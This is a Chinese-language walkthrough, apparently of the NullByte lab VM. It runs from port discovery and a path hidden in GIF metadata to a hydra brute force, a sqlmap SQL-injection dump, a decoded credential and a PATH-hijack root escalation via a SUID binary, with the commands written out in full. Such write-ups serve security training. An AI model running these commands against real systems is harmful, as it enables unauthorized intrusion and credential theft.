# NullByte

![image-20200623202132962](assets/NullByte.assets/image-20200623202132962.png)

![image-20200623202252351](assets/NullByte.assets/image-20200623202252351.png)

![image-20200623202923806](assets/NullByte.assets/image-20200623202923806.png)

777端口，浏览器一闪而过

bp抓包发现是ssh

![image-20200623203957063](assets/NullByte.assets/image-20200623203957063.png)

80端口

![image-20200623205040326](assets/NullByte.assets/image-20200623205040326.png)

![image-20200623211512809](assets/NullByte.assets/image-20200623211512809.png)

![image-20200623211544628](assets/NullByte.assets/image-20200623211544628.png)



![image-20200623205140672](assets/NullByte.assets/image-20200623205140672.png)

尝试了由这个关键词可以组合的目录，并没有新的信息

下载这个gif图片进行分析，并附加到利用cewl制作的字典中

![image-20200623213450820](assets/NullByte.assets/image-20200623213450820.png)

再利用这个自动对目录进行重新FUZZ

```bash
wfuzz -w wordlist.txt http://192.168.43.11/FUZZ
```

虽然没有fuzz出目录，但是我们注意到一组字符串。

![image-20200623213831433](assets/NullByte.assets/image-20200623213831433.png)

这个字符串是strings打出来的，但是并不是正常应该出现在图像文件字符。

这一点也同样可以用exiftool验证

![image-20200623220217741](assets/NullByte.assets/image-20200623220217741.png)

![image-20200623212914653](assets/NullByte.assets/image-20200623212914653.png)

尝试浏览

```bash
http://192.168.43.11/kzMb5nVYJw/
```

果然

![image-20200623214129680](assets/NullByte.assets/image-20200623214129680.png)

这是在提示我们用暴力进行测试

先抓包看一下

![image-20200623214325473](assets/NullByte.assets/image-20200623214325473.png)

错误会提示invalid key

![image-20200623214536349](assets/NullByte.assets/image-20200623214536349.png)

构建hydra 语句

```bash
hydra -l "" -P /usr/share/wordlists/rockyou.txt 192.168.43.11 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -I
```

![image-20200623221742834](assets/NullByte.assets/image-20200623221742834.png)

![image-20200623221933530](assets/NullByte.assets/image-20200623221933530.png)

抓一下包

![image-20200623222140045](assets/NullByte.assets/image-20200623222140045.png)

反复测试了几次可以输入的内容，回显都只有一种。

fuzz也没有打出其他内容，参考之前登录的时候说登录的form没有连接到mysql，那么这个form可能连接到mysql？

尝试sqlmay跑一下

```bash
sqlmay -u "http://192.168.43.11/kzMb5nVYJw/420search.php?usrtosearch=user" --dbs
```

![image-20200623223000280](assets/NullByte.assets/image-20200623223000280.png)

果然存在注入，之前打出了phpmyadmin，先dump

```bash
sqlmap -u "http://192.168.43.11/kzMb5nVYJw/420search.php?usrtosearch=user" -D phpmyadmin --dump --batch
```

都是空表，没有内容。再dump seth

```bash
sqlmap -u "http://192.168.43.11/kzMb5nVYJw/420search.php?usrtosearch=user" -D seth --dump --batch
```

![image-20200623224153515](assets/NullByte.assets/image-20200623224153515.png)

```bash
ramses:YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
```

解码

![image-20200623224347932](assets/NullByte.assets/image-20200623224347932.png)

```bash
c6d6bd7ebf806f43c76acc3681703b81
```

![image-20200623224709627](assets/NullByte.assets/image-20200623224709627.png)

![image-20200623224743950](assets/NullByte.assets/image-20200623224743950.png)

```bash
ramses:omega
```

我们之前打出777是ssh，尝试登录

![image-20200623224931488](assets/NullByte.assets/image-20200623224931488.png)

基础枚举，看来我们有一个suid文件

![image-20200623225817866](assets/NullByte.assets/image-20200623225817866.png)

![image-20200623225945387](assets/NullByte.assets/image-20200623225945387.png)

看上去这个程序应该是调用了ps

![image-20200623230215909](assets/NullByte.assets/image-20200623230215909.png)

我们可以尝试将ps替换成bash，并修改环境变量。从而欺骗procwatch

```bash
ln -s /bin/bash ps
export PATH=`pwd`:${PATH}
```

![image-20200623231924275](assets/NullByte.assets/image-20200623231924275.png)

![image-20200623231951589](assets/NullByte.assets/image-20200623231951589.png)

可以成功调用bash，但是用户并不是root

删除我们建立的伪造ps，重新执行procwatch查看一下，发现procwatch中ps中显示的shell是sh

![image-20200623232136292](assets/NullByte.assets/image-20200623232136292.png)

重新链接ps到sh

```bash
ln -s /bin/sh ps
export PATH=`pwd`:${PATH}
```

![image-20200623232305896](assets/NullByte.assets/image-20200623232305896.png)